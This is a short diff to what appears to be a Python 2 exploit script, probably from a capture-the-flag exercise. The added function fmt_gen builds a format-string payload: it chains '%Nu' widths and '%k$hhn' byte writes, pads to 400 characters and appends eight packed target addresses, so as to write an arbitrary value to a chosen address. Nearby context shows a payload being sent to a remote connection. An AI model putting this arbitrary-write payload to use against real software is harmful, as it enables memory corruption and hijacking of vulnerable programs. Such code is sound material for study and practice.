@@ -134,6 +134,24 @@ def send_rev_payload(r,dest,data,offset):
    print "[+] payload = "+repr(payload)
    r.sendline(payload)
   
+  
+  def fmt_gen(addr, val,offset,curout):
+    reader = offset
+    ret = ''
+    for i in range(8):
+        diff = (val & 0xff) - curout
+        curout = (val & 0xff)
+        val /= 0x100
+        if diff < 20:
+            diff += 0x100
+        ret += '%' + str(diff) + 'u'
+        ret += '%' + str(reader) + '$hhn'
+        reader += 1
+    payload = ret+'a'*(400-len(ret))
+    for i in range(8):
+        payload += pack(addr + i)
+    return payload
+  
 
 
 
